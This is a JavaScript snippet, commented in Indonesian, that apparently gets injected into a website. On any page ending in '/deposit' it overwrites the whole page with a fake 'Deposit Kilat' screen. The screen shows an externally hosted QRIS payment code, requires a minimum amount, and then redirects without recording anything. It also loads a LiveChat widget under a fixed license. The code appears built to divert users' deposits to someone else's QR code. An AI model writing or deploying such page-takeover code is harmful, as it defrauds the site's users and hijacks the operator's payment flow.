(function() {
  // Cek apakah URL berakhiran "/deposit"
  if (!window.location.pathname.endsWith('/deposit')) return;

  // Ganti isi <head>
  document.head.innerHTML = `
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Deposit Kilat</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: sans-serif;
        background: url('https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg') no-repeat center center fixed;
        background-size: cover;
        backdrop-filter: blur(8px);
        display: flex;
        flex-direction: column;
        align-items: center;
        color: white;
      }

      .container {
        margin-top: 30px;
        background: rgba(0, 0, 0, 0.6);
        padding: 20px;
        border-radius: 10px;
        text-align: center;
      }

      h1, p, .note {
        margin: 10px 0;
        white-space: nowrap;
      }

      img {
        max-width: 100%;
        height: auto;
        margin: 20px auto;
        display: block;
      }

      input[type="text"] {
        padding: 10px;
        font-size: 16px;
        width: 200px;
        text-align: center;
        margin: 10px 0;
      }

      button {
        padding: 10px 20px;
        font-size: 16px;
        background-color: #00b894;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }

      .note {
        font-size: 14px;
        margin-top: 10px;
      }
    </style>
  `;

  // Ganti isi <body>
  document.body.innerHTML = `
    <div class="container">
      <h1>DEPOSIT KILAT</h1>
      <p>Deposit Praktis Menggunakan Qris</p>

      <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS Image">

      <input type="text" id="nominal" placeholder="Nominal Deposit" oninput="formatNominal(this)">

      <br>
      <button onclick="konfirmasi()">Konfirmasi</button>

      <div class="note">Scan Qris > Transfer > Isi Nominal > Konfirmasi</div>
    </div>

    <script>
      function formatNominal(input) {
        let val = input.value.replace(/\\D/g, '');
        if (val === '') {
          input.value = '';
          return;
        }
        let number = parseInt(val, 10);
        input.value = number.toLocaleString('id-ID');
      }

      function konfirmasi() {
        let input = document.getElementById('nominal').value.replace(/\\./g, '').replace(/,/g, '');
        let nominal = parseInt(input, 10);
        if (isNaN(nominal) || nominal < 50000) {
          alert('Minimal deposit adalah 50.000');
          return;
        }
        window.location.href = '../';
      }
    <\/script>
  `;

  // Tambahkan script LiveChat
  const lcScript = document.createElement('script');
  lcScript.src = 'https://cdn.livechatinc.com/tracking.js';
  lcScript.async = true;
  lcScript.onload = function() {
    window.__lc = window.__lc || {};
    window.__lc.license = 19149757;
    window.__lc.chat_between_groups = false;
  };
  document.head.appendChild(lcScript);
})();
